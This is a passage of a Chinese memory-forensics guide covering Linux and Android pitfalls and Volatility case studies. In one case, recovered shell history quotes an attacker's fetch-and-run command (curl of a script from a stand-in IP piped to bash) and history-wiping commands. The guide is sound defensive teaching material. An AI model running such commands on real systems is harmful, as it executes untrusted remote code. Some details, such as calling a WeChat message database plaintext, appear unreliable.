这不是形式——SELinux 状态改变了采集期间系统的访问控制行为，处于 Permissive 时组件的访问行为集合与 Enforcing 下不同（被记录但不拦截），**这使"采集期间的状态"与"正常状态"不可直接比较**。

**影响**：**证据前提缺失**。对方可以主张"取证过程改变了系统安全状态，采集结果不能代表案发时的状态"。而 [第 02 篇](../memory-acquire/memory-acquire-memory-acquisition-methods.md)已经说明这个状态变更**必须在采集前做双向记录、采集后恢复原状**——**恢复动作本身也要记录**。

**核查**：**全程记录 `getenforce` 前后值**（3.3 的脚本在采集前记录了初始值；采集后应再记录一次恢复值）。

**在报告的采集方法章节明示这一状态变更**，并说明采集后已恢复。

**root 本身也是一项状态变更**（`id` 输出 uid=0 的取得过程），对原本未 root 的设备而言这是重大改变。

<a id="section-31"></a>

#### 陷阱 14：不记录内核版本就采集

**现象**：Android 采集脚本里没有 `uname -a` 这一行，或者采集完才想起来要记录内核版本。

**原因**：3.1 的第 1 步是「确认目标内核版本（**采集时就应记录**）」，3.3 的采集脚本把它放在第 4 行。**内核版本决定了符号能不能构建**——`btf2json` 需要 `/sys/kernel/btf/vmlinux`（它与运行中的内核严格对应）加 `System.map-$(uname -r)`，这两个文件都在目标机上。**不记录版本，事后你不知道该找哪个内核的符号输入。**

**影响**：**与陷阱 2 联动**——Linux 侧的符号问题会因为缺版本记录而彻底无法解决。

而 Android 的内核版本串（`5.10.134-android12-9`）**携带厂商与 ABI 级别信息**，不同厂商的内核构建不同，**同版本号字符串也不能保证二进制相同**（1 提到"各发行版与自定义内核都会改动内核，同版本号的二进制也未必相同"）。

**核查**：**采集脚本的开头就记录完整的环境标识**——`ro.product.model`、`ro.build.version.release`、`ro.build.fingerprint`、`uname -a`、`getenforce`、`/proc/meminfo`、`ps -A`（3.3 的脚本已经这么做了）。

`ro.build.fingerprint` 尤其重要：它是设备的唯一构建标识，包含了厂商、构建号、增量版本，**在事后定位具体固件与内核二进制时是唯一可靠的线索**。

<a id="section-32"></a>

#### 陷阱 15：对已关机设备做 Android 内存取证并期待明文

**现象**：手机关机后送检，做内存采集，在镜像里搜聊天记录、文件内容，一无所获。

**原因**：[第 01 篇](../memory-acquire/memory-acquire-memory-forensics-overview.md)2.4 的最后一段解释了这个机制——现代 Android 与 iOS 使用文件级加密，密钥由硬件安全模块派生，**系统解锁前 data 分区在内存中是密文**。内存中确实存在这些数据，但呈现形式是不可读的密文块。这一点与本篇 2.6 的 iOS 结论是同一逻辑的不同表现。

**影响**：容易滑向两个坏结论——"设备上没有这些数据"（错误，它们在磁盘上，只是没解开），或者为了解密而绕过锁屏（**超出授权范围，取证违规**）。

**核查**：**iOS 的处置方式同样适用于 Android**——2.6 的实务建议说得很清楚：**内存维度应作为"证据局限"明确写入报告**，而不是勉强用日志冒充内存证据。

已关机/已锁定设备的明文内容应转向磁盘侧的解锁后镜像。**任何情况下都不为取证目的绕过锁屏。**

<a id="section-33"></a>

#### 陷阱 16：把 `idevicesyslog`、Crash 日志、`ipsw` 当成 iOS 内存证据

**现象**：报告里把 `idevicesyslog` 的输出、Crash 日志、或从 `ipsw` 提取的内容列为"iOS 内存取证结果"。

**原因**：2.6 的引文专门做了这个概念澄清——`idevicesyslog` 只是系统日志（等价于 `log stream`），Crash 日志是**崩溃转储（仅崩溃瞬间的少量内容）**，`ipsw` 是**固件镜像**。**三者都不是内存镜像**。误判的来源是这些材料确实来自设备、也确实包含运行时信息，于是被归入"内存证据"这个笼统类别。

**影响**：**用弱证据冒充强证据**。内存证据的特殊价值在于它是"采集时刻的系统状态"，而系统日志是**滚动缓冲**（可能已覆盖关键时段）、Crash 日志是**崩溃瞬间的少量内容**。

**性质完全不同，结论强度也完全不同。**

**核查**：**iOS 的内存维度作为"证据局限"明确写入报告**（2.6 的原话）。

2.6 的结论先行——**现代 iOS 上在线内存采集不可行**：必须越狱、公开方案已失效、Apple 不向第三方开放内核内存访问（仅企业 MDM 有正式通道）。

这四条障碍是**平台性的**，不是"换个更厉害的工具"能解决的。

<a id="section-34"></a>

### 4.4 阴性结论与检出能力

<a id="section-35"></a>

#### 陷阱 17：把 rootkit 四层检查无异常写成"无 rootkit"

**现象**：`check_modules`、`hidden_modules`、`check_syscall`、`check_idt`、`tty_check` 全部无异常，报告写"未发现 rootkit"。

**原因**：2.3 的三层表格里**每一层都标注了局限**：用户态层"需与发行版哈希基线比对"；模块层"**若 sysfs 被篡改则失效**"；内核级"隐蔽性最高"。案例第 5 步跑了四项检查后，结论表的措辞是「**未发现内核级 rootkit**」且强度标为「中（**阴性结果，检出能力有限**）」——它限定了范围（内核级）、限定了手段（四项检查）、并标注了局限。案例引文第 ② 条直接说：「"四项检查未发现异常"不等于"不存在 rootkit"」。

**影响**：**三层覆盖不完整**。

用户态替换（`ls`/`ps`/`ss` 被劫持）**需要与发行版哈希基线比对**才能发现，而案例第 5 步只查了"命令路径是否在标准路径"——**路径正确不等于文件未被替换**。

这是一个真实的覆盖缺口。

**核查**：**阴性结论必须与检测面对应**。三层分别写：

① 用户态——做了什么检查、基线从哪来（**没有基线就写明这项未覆盖**）
② 模块层——`check_modules` 的原理依赖 sysfs 可信（若 rootkit 篡改了 `/sys/module`，这个检查会失效）
③ 内核级——`check_syscall` / `check_idt` / `tty_check` 覆盖什么

"在 A/B/C 三层检查范围内未发现异常"才是准确的表述。

<a id="section-36"></a>

#### 陷阱 18：把 `check_modules` 与 `hidden_modules` 当成同一种检查

**现象**：跑了 `check_modules` 无异常，报告写"未发现隐藏模块"，跳过 `hidden_modules`。

**原因**：2.3 的引文专门区分了这两个插件——`check_modules` 比对"内存中的模块信息"与"sysfs 中可读到的信息"，若 rootkit 篡改 `/sys/module` 隐藏了模块，两者会不一致；而 `hidden_modules` 专门寻找"在内存里有完整结构、但未出现在模块列表"的模块。两者的检测路径不同：前者是**双源比对**（内存 vs sysfs），后者是**扫描内存找孤儿结构**。

**影响**：**双源比对在源头被污染时失效**。如果 rootkit 篡改了 sysfs 让 `check_modules` 看到"一致"，那么 `check_modules` 就通过了——但 `hidden_modules` 仍可能发现那个孤儿模块。

跳过它等于放弃了这条独立的检测路径。

**核查**：**两个都跑**（速查第 3 节都列了，`modxview` 是多视角比对的补充）。

**阴性结论里要区分这两个检查的覆盖对象**——"内存与 sysfs 一致，未发现未登记模块结构"是一个结论，它的前提是"内存中的模块信息读取正确"，而这个前提本身依赖其它检查。

<a id="section-37"></a>

#### 陷阱 19：把 TTY 检查当作键盘记录器的完整检测

**现象**：`tty_check` 无异常，报告写"未发现键盘记录器"。

**原因**：2.3 的引文给的是"TTY 检查是 Linux 独有的检测面，键盘记录器必须挂钩 TTY 层的输入处理函数——这是它的工作原理决定的"。这个原理性判断很强，但它限定的是**一类**键盘记录器。**不挂钩 TTY 的实现路径存在**：通过 `/dev/input` 事件设备直读、通过 X11/Wayland 层的输入捕获、用户态的库函数 hook、或者在**图形界面环境下根本没有 TTY 输入**（现代桌面 Linux 的键盘输入走 Wayland/X11，不经过 TTY 层的行编辑处理）。

**影响**：**把一类检测面的阴性扩大成全类阴性**。案例第 5 步的结论表用的是「未发现内核级 rootkit」而不是"未发现键盘记录器"——**这个措辞的收敛是刻意的**。

**核查**：**限定检测面**。表述形态：「`tty_check` 未发现 TTY 层输入处理函数被替换，该检查不覆盖通过 `/dev/input` 或图形栈实现的输入捕获」。

**与现代桌面环境配合时，这条检查的价值还要再打折**——很多服务器本就没有 TTY 活动，`tty_check` 无异常可能只是因为**没有可供检查的输入路径**。

<a id="section-38"></a>

#### 陷阱 20：Android 初筛用 `strings` 一次读全镜像

**现象**：对数 GB 的 Android 镜像直接跑 `strings -a -n 6`，命令跑很久后被 kill，或分析机内存耗尽。

**原因**：3.3 的初筛脚本前有一个明确的警告——手机镜像同样动辄数 GB，`strings` 一次读全会 OOM，并给出了两条出路：复用 [第 06 篇](memory-artifact-memory-network-artifacts.md)的 `scan_img` 分块函数，或对单进程先切出可疑进程的内存再扫。**"手机内存小所以没事"的直觉是错的**——采集出来的是**物理内存镜像**，8 GB 手机的镜像就有 8 GB 左右（案例 [第 02 篇](../memory-acquire/memory-acquire-memory-acquisition-methods.md)第 3 步的实际值是 7.73 GiB）。

**影响**：与 [第 07 篇](memory-artifact-memory-credentials-and-keys.md)的同一问题——**命令被 kill 后已写入的输出文件是不完整的**，而你可能没注意到，从而得到一份看起来正常但不完整的初筛结果。

Android 初筛的六条规则（注入框架、临时 .so、凭据、云密钥、root 框架）任何一条漏扫，结果都不完整。

**核查**：**必须分块**（速查第 5 节，`scan_img` 的六个调用都在）。

**对高价值目标定向缩小范围再扫**——先用 `linux.proc.Maps` 定位可疑进程与其 VMA，只对该进程的内存区域做全量字符串提取，**这样既避开块边界问题又不遗漏**。

`scan_img` 的块边界局限在 [第 06 篇](memory-artifact-memory-network-artifacts.md)3.5 已经说明（"块边界会切断字符串"），对密钥搜索影响不大但需意识到。

<a id="section-39"></a>

#### 陷阱 21：把容器化环境里的进程状态当作宿主机的

**现象**：在容器化部署的服务器上做 Linux 内存取证，看到大量进程与挂载点，报告描述为"该服务器运行着这些服务"。

**原因**：本篇没有展开容器维度，但 6 的方向表里明确列了「容器逃逸痕迹：容器内进程、命名空间穿越痕迹（`/proc/<pid>/ns/` 对比）」，而 2.2 的 `linux.mountinfo` 工件本身就包含**网络文件系统**这类信息。容器内看到的是**命名空间隔离后的视图**——同一台宿主机的容器内 `/proc` 与宿主机的 `/proc` 内容不同，**但内存镜像里的内核数据结构是宿主的**。这带来一个具体的陷阱：进程名看起来像系统服务，但它可能运行在某个容器命名空间里。

**影响**：**归因到错误的执行环境**。委托方问"是哪个服务被攻破了"，你回答的可能是容器内的某个进程，而实际的责任边界在宿主机或编排层。

**核查**：发现可疑进程后用 `linux.mountinfo` 与 `linux.lsof` 确认它所在的挂载上下文，必要时对比命名空间信息。

**报告里对"该机运行 X 服务"的表述要限定层级**——是宿主机的服务，还是某个容器内的进程。

**这与"进程归属"的一般性陷阱是同一类问题**：名字不等于部署位置。

<a id="section-40"></a>

## 五、案例示例

> **脱敏约定**：本章涉及从检材中提取的凭据一律以掩码呈现（`AKIA****NRT`、`****`）。完整值只存于受控存储，不进入 Wiki 与报告正文。

<a id="section-41"></a>

### 5.1 磁盘历史被清空后从内存恢复 bash 命令时间线

**场景**

查获一台 CentOS Stream 9 服务器（64 GB RAM），已关机但内存模块仍在，运维方提供了内存转储 `DigiForensics-mem.raw`。委托方要求确认两件事：是否存在 rootkit，以及攻击者执行了哪些命令。

运维方同时提供了 `/boot/vmlinux-5.14.0-427.el9.x86_64`。**这一步很关键** —— Linux 内核转储的符号必须自建，而带 DWARF 调试信息的 vmlinux 是唯一的可靠来源。

这条路径的特别之处在于：磁盘上的攻击痕迹已被主动清除，而内存缓冲区完整保留了包括清除动作本身在内的全部记录，并带时间戳。这是 Linux 内存取证不可替代价值的直接体现。

**处置过程**

第一步，构建符号。运维方提供的 vmlinux 是否含 BTF 决定了路线：

```bash
$ readelf -S /boot/vmlinux-5.14.0-427.el9.x86_64 | grep -i btf
（无 BTF 段 → 走 dwarf2json 路线，正好有带 DWARF 的 vmlinux）

$ go build .    # 在 dwarf2json 源码目录内构建
$ ./dwarf2json linux --elf /boot/vmlinux-5.14.0-427.el9.x86_64 \
  > /opt/isf/linux/5.14.0-427.el9.x86_64.json
$ sha256sum /opt/isf/linux/5.14.0-427.el9.x86_64.json >> evidence/isf-hashes.txt
```

第二步，验证符号是否真的生效：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.pslist | head -6
OFFSET (V)           PID  TID    PPID  COMM
0xffff8b200000000      0    0      0  swapper/0/0
0xffff8b200018000      2    2      0  kthreadd
0xffff8b200028000      9    9      2  ksoftirqd/0
...
 1820    1    sshd
 2480  1820    bash
```

`OFFSET (V)` 列全部非 `0x0` 且 PPID 关系自洽（`kthreadd`(2) → `ksoftirqd`(9)、`init` → `sshd`(1820) → `bash`(2480)），说明 `task_struct` 的字段偏移全部命中。

第三步，先确认磁盘侧的损失状况：

```bash
$ ls -l /evidence/disk/root/.bash_history
-rw------- 1 root root 0 2026-03-01 ...    # 0 字节，已被清空
$ ls -l /evidence/disk/root/
# 无 .bash_history 的备份，无历史日志轮转残留
```

磁盘侧的 `bash_history` 是 0 字节，且无备份、无轮转残留。

这确立了"磁盘线索已被主动销毁"这个事实。

第四步，从内存恢复命令历史：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.bash \
    > /work/bash_history.csv
$ cat /work/bash_history.csv
ProcessName  PID  CommandTime               Command
bash         2480  2026-02-11 03:17:22      curl -s http://198.51.100.77/ipt.sh | bash
bash         2480  2026-02-11 03:17:41      chmod +x /tmp/.x/iptables
bash         2480  2026-02-11 03:19:08      history -c
bash         2480  2026-02-11 03:19:15      rm -f /root/.bash_history
```

四条记录构成完整的时间线，且最后两条正是清除痕迹的动作本身。

`history -c` 清空内存中的历史列表，`rm -f` 删除磁盘文件 —— 两条命令都在内存里留了记录，这是"自证反取证"的典型形态。

第五步，检查 shell 会话的环境变量（凭据残留，按掩码记录）：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.envars \
    | grep -iE 'KEY|TOKEN|SECRET|PASS' \
    | sed -E 's/(AKIA.{4}).{9,}/\1****/'
PID   PPID  Process  Variable         Value
2480  1820  bash     AWS_ACCESS_KEY_ID  AKIA****NRT
2480  1820  bash     DB_PASSWORD       ****
```

第六步，rootkit 检查分三层逐层做，**不合并为一步**：

```bash
# 第一层：命令路径是否被替换
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.lsof \
    | grep -E '/usr/bin/(ls|ps|ss|cat|netstat)'
# 全部指向标准路径，无同名替换

# 第二层：内核模块
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.lsmod
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.malware.check_modules
# 与 sysfs 一致，无隐藏模块

# 第三层：系统调用表与 TTY 钩子
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.malware.check_syscall
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.malware.tty_check
# 均未发现钩子
```

第七步，摘链检查用集合差：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.psscan \
    | awk 'NR>1{print $2}' | sort -u > /tmp/s.txt
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.pslist \
    | awk 'NR>1{print $2}' | sort -u > /tmp/l.txt
$ echo "psscan=$(wc -l < /tmp/s.txt)  pslist=$(wc -l < /tmp/l.txt)"
psscan=214  pslist=214
$ comm -13 /tmp/l.txt /tmp/s.txt
（无输出）
```

第八步，网络痕迹做交叉验证：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.sockscan \
    | grep '198.51.100.77'
... 198.51.100.77:80  1a2b3c4d  ESTABLISHED ...
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.sockstat \
    | grep -c '198.51.100.77'
0
```

`sockscan`（内存池扫描）有，`sockstat`（内核 sock 结构链表）无。 与 Windows 侧 `netscan`/`netstat` 的关系完全一致：池残留不能单独作为外联证据。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 磁盘命令历史已被主动清空 | `/root/.bash_history` 为 0 字节，无备份与轮转残留 | 强 |
| 攻击者于 02-11 03:17 从 `198.51.100.77` 取回并执行了脚本 | `linux.bash` 历史带时间戳，磁盘已被清空 | 强 |
| 攻击者于 03:19 主动清除历史 | `history -c` 与 `rm -f` 两条命令本身在内存历史中 | 强（自证反取证） |
| 该 shell 会话残留 AWS Key ID 与数据库口令 | `linux.envars`，掩码呈现 | 强（存在性） |
| 残留凭据的完整性未确认 | AWS 仅见 ID，未检索配套 Secret | 中（阴性范围见下） |
| 未发现内核级 rootkit | 三层检查（路径/模块/钩子）均无异常 | 中 |
| 未发现摘链隐藏进程 | `pslist` 与 `psscan` 的 PID 集合完全一致（均 214） | 中 |
| `sockscan` 中的 IP 不足以单独作为外联证据 | `sockstat` 中该连接不存在 | 强（已排除） |

**能证明的**：命令历史的存在与内容（磁盘已被销毁，仅内存可证）；外联行为由**命令记录**证明；痕迹清除动作被记录。

**不能证明的**：

- **不能证明脚本执行后的具体行为**。命令历史只记录输入，不记录执行结果
- **不能证明脚本内容**。`/tmp/.x/` 目录未在磁盘上找到对应文件，脚本本体未留存
- **不能证明该凭据被用于该次操作**。环境变量存在不等于被使用

**未覆盖范围与阴性边界**：
- rootkit 检查覆盖命令路径、模块、syscall 表、TTY 四项；**未覆盖**：`/proc` 挂载点的 FUSE 挂载、内核内存动态补丁（kprobe/kfence）、以及 `LD_PRELOAD` 注入
- AWS Secret Access Key 的检索仅覆盖 `envars` 与字符串序列；**未覆盖**：以文件形式写入的凭证、`~/.aws/credentials`（本次该文件是否存在未核查）
- 摘链阴性结论基于 `pslist`/`psscan` 两视角；**未验证** `/proc` 的完整性（被 FUSE 挂载替换时两者可同时失效）

**误判对照**

这个案例要处理两个方向的误判。

**方向一：把内存恢复的历史当作"完整的历史"。**

`linux.bash` 从内存中提取的是 bash 的历史缓冲区。这个缓冲区有明确的失效机制：**缓冲区满时最旧的记录被覆盖**、`history -c` 会清空列表、`HISTFILE` 指向的文件被删除不影响已在内存中的记录、以及 bash 退出时缓冲区随之释放。

判据是**记录的时间连续性**。

本次四条记录的时间跨度是 03:17:22 到 03:19:15，**中间无空档且单调递增** —— 这说明缓冲区未发生覆盖，被恢复的是该会话的完整历史。

若发现时间戳有大段跳跃，就说明中间有记录被覆盖，**"完整"这个前提不成立**。

按错误判据走的代价：报告写"攻击者执行了以下命令"并列出 4 条，读起来像完整行为清单。实际情况可能是"缓冲区中仅存的 4 条"。

**这个差别在复核时会暴露** —— 委托方拿日志里的其他事件一对照就发现中间有大段空白。

方向二：把 `sockscan` 的 IP 直接写成外联证据。

`linux.sockscan` 扫的是内核对象池（slab/slub），与 Windows 侧 `netscan` 的失效机制相同：对象释放后其内容不被清零，后续分配会覆盖，但在覆盖前旧内容仍可读。

`linux.sockstat` 遍历的是当前活动的 `struct sock` 链表 —— **两者的差集就是池残留的识别信号**。

本次 `sockscan` 有、`sockstat` 无，判定为池残留。

关键在于：真正的外联证据由 `linux.bash` 里的 `curl` 命令提供 —— 那是一条带时间戳的命令记录，与连接状态无关，可独立成立。

判据整理：

| 证据 | 强度 | 理由 |
|---|---|---|
| `linux.bash` 中的 `curl` 命令 | 强 | 命令记录，独立于连接状态，可验证时间 |
| `linux.sockstat` 中的活动连接 | 强 | 内核活动链表当前状态 |
| `linux.sockscan` 中独有的 IP | 弱 | 池残留，可能来自任意历史时刻 |

选证据的原则：同一事实有多条证据时，选强度最高的那条，并说明为什么不用另一条。

本案若用 `sockscan` 那条，结论强度从"强"降到"可能"，而且一旦对方追问"你怎么确定这不是残留"，就难以回答。

**第三个细节值得写进报告**：`history -c` 与 `rm -f` 出现在历史里，本身就是"有人清除痕迹"的证据。

这个推论链是：内存里存在 `history -c` → 该命令被执行过 → 执行者的意图是清除内存历史 → 执行者是 shell 的使用者（PID 2480，其父为 `sshd` 1820） → 通过 SSH 会话操作。

这个链条的每一环都是命令记录的直接推论，不依赖任何反取证工具的检测结果。

这是内存取证相对磁盘取证的一个结构性优势：清除动作本身留在内存里。

<a id="section-42"></a>

### 5.2 Android 内存中的即时通讯痕迹与账号归属

**场景**

查获一台已 root 的 Android 手机内存镜像 `DigiForensics-mem.raw`（8 GB RAM，Android 13，采集时间 2026-03-15 10:12:33）。委托方要求确认"该机在事发时段是否登录过某社交平台的特定账号，以及是否发生了聊天记录删除"。

手机内存取证有个常被低估的特点：IM 应用的数据库在移动端通常是明文 SQLite（不像桌面端有额外的加密层），而用户往往误以为聊天记录是加密的。

**处置过程**

先确认镜像可用并建立基线：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf android.bundleinfo | head -5
Name                    PID  PPID
com.tencent.mm           3312  1
com.android.chrome      2884  1
com.google.android.gms  2210  1

$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.pslist | wc -l
214
```

第二步，**按包名定位应用数据目录，而不是全镜像盲搜**：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf android.dumpsys \
    --pid 3312 2>/dev/null | grep -iE 'dataDir|userId|codePath'
dataDir=/data/user/0/com.tencent.mm
userId=0
codePath=/data/app/~~aBcD==/com.tencent.mm-3f8a1c
```

`dataDir=/data/user/0/...` + `userId=0` 确认这是**主用户（owner）的数据分区**。

多用户设备上这个字段是归属判断的前提。

第三步，直接检索数据库路径：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.vadyarascan \
    --pid 3312 --pattern "com.tencent.mm/databases/Msg" | head
0x1f8a0000  0x7f2b400000  /data/user/0/com.tencent.mm/databases/Msg.db
0x1f8b0000  0x7f2b400000  /data/user/0/com.tencent.mm/databases/EnMicroMsg.db
```

**`EnMicroMsg.db` 命中** —— 这是该应用的主消息库。

路径完整且带 `/data/user/0/` 前缀，证明是真实路径而非构造字符串。

第四步，提取库内容并核对表结构：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.vadyarascan \
    --pid 3312 --pattern "SQLite format 3" --dump \
    -o /work/wx-dumps
$ ls -l /work/wx-dumps/ | head -3
-rw-r--r-- 1 foren foren 1048576 ...   # 完整 1 MB 页
$ sqlite3 /work/wx-dumps/chat.db ".tables"
ChatLog  SnsInfo  SnsRemark  contact
$ sqlite3 /work/wx-dumps/chat.db "PRAGMA page_size; PRAGMA page_count;"
512
1872
```

第五步，核对目标账号是否真的登录过 —— 查账号表而非消息表：

```bash
$ sqlite3 /work/wx-dumps/chat.db \
    "SELECT NickName, UserName, Sex, ContactTypeFlag FROM SnsInfo LIMIT 5;"
<昵称已脱敏>  wxid_****  1  3
<昵称已脱敏>  wxid_****  2  3
```

`ContactTypeFlag = 3` 表示该联系人是**已登录的本人账号**（值 1/2 分别是陌生人/普通联系人）。

这是一个把"消息存在"转成"该账号被使用"的关键字段。

第六步，查删除痕迹。删除操作在 SQLite 层面有三种表现，要分开查：

```bash
# 表现一：freelist 中残留的已删除记录
$ sqlite3 /work/wx-dumps/chat.db "PRAGMA freelist_count;"
342
# 342 个空闲页 → 有过大量删除或更新

# 表现二：已删除记录的内容残留在空闲页中
$ strings /work/wx-dumps/chat.db | grep -cE '2026-03-1[45]'
118
# 与事件时段相符的消息片段残留在库中

# 表现三：数据库文件的 mtime（内存镜像内不可用，需磁盘侧）
$ ls -l /evidence/disk/data/user/0/com.tencent.mm/databases/EnMicroMsg.db
# 磁盘侧 EnMicroMsg.db 存在，mtime 2026-03-15 09:40:12
```

第七步，**把内存侧与磁盘侧做哈希与体积对照**：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.vadyarascan \
    --pid 3312 --pattern "EnMicroMsg.db" --dump -o /work/wx-dumps
$ ls -l /work/wx-dumps/EnMicroMsg.db /evidence/disk/data/user/0/com.tencent.mm/databases/EnMicroMsg.db
-rw-r--r-- 1 foren foren 1945677 ...   # 内存侧恢复
-rw-r--r-- 1 foren foren 1976832 ...   # 磁盘侧
$ sqlite3 /work/wx-dumps/EnMicroMsg.db "PRAGMA integrity_check;"
ok
```

内存侧恢复 1,945,677 字节 < 磁盘侧 1,976,832 字节，**差 31,155 字节。**

`integrity_check` 返回 `ok` 说明恢复的库结构完整。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 该机安装并运行过目标 IM 应用（主用户数据） | `android.bundleinfo` + `dumpsys` 的 `dataDir=/data/user/0/` | 强 |
| 主消息库在内存中完整可解析 | 库路径命中 + 4 张表可读 + `integrity_check = ok` | 强 |
| 本人账号曾在此应用登录 | `SnsInfo` 中 `ContactTypeFlag=3` | 强 |
| 事发时段前存在消息记录 | `strings` 检出 118 处与事件时段相符的片段 | 中 |
| 库内存在删除或更新操作 | `freelist_count = 342` | 中 |
| 内存侧恢复的库比磁盘侧少 31,155 字节 | 体积对照 | 强（差异本身） |
| **该账号的密码被提取** | — | **不成立（本次未做，也不应做）** |

**能证明的**：应用安装与运行事实、账号登录事实、消息库结构与部分内容、删除操作的存在。

**不能证明的**：

- **不能证明这些消息由本机使用者本人查看或发送**。IM 应用的数据库在登录后由服务端持续同步，本机数据库里的消息可能是任意时间由其他设备发送后同步过来的
- **不能证明消息在屏幕上被查看过**
- **不能证明删除由机主执行**。`freelist_count = 342` 只说明有过删除或更新，可能是应用自身的正常数据维护
- **不能证明库内 118 处片段的具体内容或完整性** —— `strings` 的输出是碎片，不是可读的记录

**未覆盖范围**：仅在采集窗口内、对 PID 3312 的 VAD 空间做了数据库路径与内容检索；**未覆盖**：已释放的 VAD、页面换出部分、账号在 Web 端或其他设备上的登录、以及消息的服务端状态。

**误判对照**

这个案例的核心误判是：把"数据库里有消息"读成"本机用户收发过这些消息"。

判据在于**移动端 IM 数据库的数据来源**。IM 应用的本地库是服务端同步的缓存：

| 观察 | 能证明 | 不能证明 |
|---|---|---|
| `SnsInfo` 有本人账号（`ContactTypeFlag=3`） | 该账号在此设备上登录过 | 消息由此设备发出 |
| `ChatLog` 有某条消息 | 该消息曾同步到此设备 | 消息由本机发送 |
| 消息时间戳在事发时段 | 时间戳值为该时刻 | 该时刻设备有网络活动 |

要证明"由本机发送"，需要的是**该设备在对应时间点的网络活动**或**发送侧的状态标记**，而不是本地库的内容。

本次未做这一步，所以结论强度只到"数据同步存在"。

第二个误判：把 `freelist_count = 342` 读成"用户删除了聊天记录"。

`freelist_count` 反映的是**空闲页数量**，而空闲页的成因至少有四种：删除行、更新行导致旧页释放、VACUUM 未执行导致的自然积累、以及应用自身的缓存数据维护。

判据要看**空闲页里残留的内容形态**：

| 空闲页内容形态 | 判读 |
|---|---|
| 碎片化字符串、无完整记录结构 | 可能是缓存维护，判据不充分 |
| 完整的消息记录（含时间戳、正文、发送方标识） | 指向具体记录的删除，证据价值高 |

本次 `strings` 检出的 118 处片段是字符串级的，**未确认其是否构成完整的可读记录**。

所以报告里正确写法是"库内存在删除或更新操作（`freelist_count=342`），空闲页中残留与事件时段相符的内容片段"，而不是"用户删除了聊天记录"。

第三个实操细节：内存侧恢复的库比磁盘侧少 31,155 字节，这个差异**不能读成"内存数据过期"**。

原因有三：内存中的库可能被部分换出、恢复工具按 VAD 连续区提取时可能截断、`--dump` 的模式可能只覆盖命中位置附近。

判据是 `integrity_check` 的结果 —— 返回 `ok` 说明恢复的部分本身是自洽的可用库，差异来自覆盖范围而非内容损坏。若 `integrity_check` 报 `malformed`，结论就完全不同。

体积差异必须与完整性检查结果一起报告，单独报告体积差异会误导。

<a id="section-43"></a>

### 5.3 反例：Android 内存未覆盖到其他用户与换出页

**场景**

委托方对 5.2 的结果提出质疑：机主坚称"我从来没登过这个账号，那些消息是别人在我手机上登的"。委托方要求确认"该设备上是否存在其他使用者账号的痕迹"。

这条路径要处理的是**阴性结论的范围纪律** —— 5.2 的结论全部建立在"主用户（userId=0）"这个前提上，而多用户设备上还有其他用户分区。

**处置过程**

第一步，明确 5.2 结论的适用分区：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf android.dumpsys     | grep -iE 'userId|user.*=' | head -5
userId=0
Users:
  UserInfo{0:机主:13} running
  UserInfo{10:访客:11} running
```

设备有两个用户：userId=0（机主）与 userId=10（访客），且两者都处于 running 状态。

5.2 的全部结论只对 `/data/user/0/` 有效。

第二步，检查访客分区的数据目录：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.vadyarascan \
    --pattern "/data/user/10/" | head -20
（无输出）
```

在采集窗口的内存中未检索到 `/data/user/10/` 路径。

第三步，但这不等于访客没有使用过设备。用其他时间维度交叉：

```bash
# 维度一：近期使用痕迹
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf android.bundleinfo \
    | grep -cE '3312|2210'
2
# 仅机主应用，无访客独立安装的应用

# 维度二：锁屏凭据使用记录
$ python3 vol.py -f DigiForensics-mem.raw -s /opt/isf android.dumpsys \
    | grep -iE 'user.*unlocked|DirectBootAware' | head
（无输出）

# 维度三：磁盘侧的分区存在性
$ ls -d /evidence/disk/data/user/10/
/evidence/disk/data/user/10/
$ du -sh /evidence/disk/data/user/10/
412K
```

磁盘侧 `/data/user/10/` 存在且有 412 KB 数据，说明访客分区曾被创建并使用过。

第四步，看访客分区里有什么：

```bash
$ find /evidence/disk/data/user/10/ -type f | head -10
/evidence/disk/data/user/10/system/...
/evidence/disk/data/user/10/cache/...
$ find /evidence/disk/data/user/10/ -name '*.db' | wc -l
0
```

访客分区只有系统缓存文件，无任何数据库文件、无应用数据。

这与"访客模式"的形态一致（访客会话的临时数据在退出时清理）。

第五步，把两个维度的阴性结果合并成有范围的结论。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 设备为双用户：userId=0（机主）与 userId=10（访客） | `android.dumpsys` 的 `UserInfo` 列表 | 强 |
| 5.2 全部结论仅适用于 `/data/user/0/` 分区 | `dumpsys` 的 `dataDir=/data/user/0/` | 强 |
| 访客分区曾被创建并使用 | 磁盘侧 `/data/user/10/` 存在，412 KB 数据 | 强 |
| 采集窗口内存中未发现 `/data/user/10/` 相关路径 | 全镜像字符串检索零命中 | 中（阴性） |
| 访客分区无应用数据 | `find` 未发现任何 `.db` 文件 | 强（磁盘侧） |

**未覆盖范围与阴性边界（必须完整列出）**：

| 未覆盖项 | 原因 | 影响的结论 |
|---|---|---|
| 访客分区中已换出到闪存的页面 | 内存采集只覆盖物理内存 | 访客使用痕迹可能被漏掉 |
| 访客分区的历史使用记录 | 当前分区数据不代表历史 | 无法排除更早的访客使用 |
